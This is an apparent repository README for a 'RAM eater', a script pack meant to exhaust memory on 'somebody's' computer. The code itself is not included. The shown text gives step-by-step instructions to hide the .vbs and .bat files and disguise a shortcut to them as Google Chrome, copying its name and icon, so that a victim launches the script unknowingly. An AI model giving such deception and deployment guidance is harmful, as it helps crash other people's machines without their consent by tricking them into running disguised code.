# RAM eater
So... You really want to eat somebody's RAM, huh?
Ok then!
The pack is up there, I mean the code.

## How to hide the RAM eater
1. Move the .vbs and .bat files somewhere you can't find them. Then hide them.
2. Go to **File Explorer > View > Show hidden items** to see the hidden files we just hid
3. Right Click the .bat file and select Show More Options (If you have Windows 11), then press *Create Shortcut*.
4. Move the Shortcut on the desktop and rename it to something (ex: Google Chrome).
5. Right Click the Shortcut and go to Properties. When you're there, press *Change Icon* to the chosen app (ex: Google Chrome). Make sure
that you know where the .ico file is.
6. you're done!
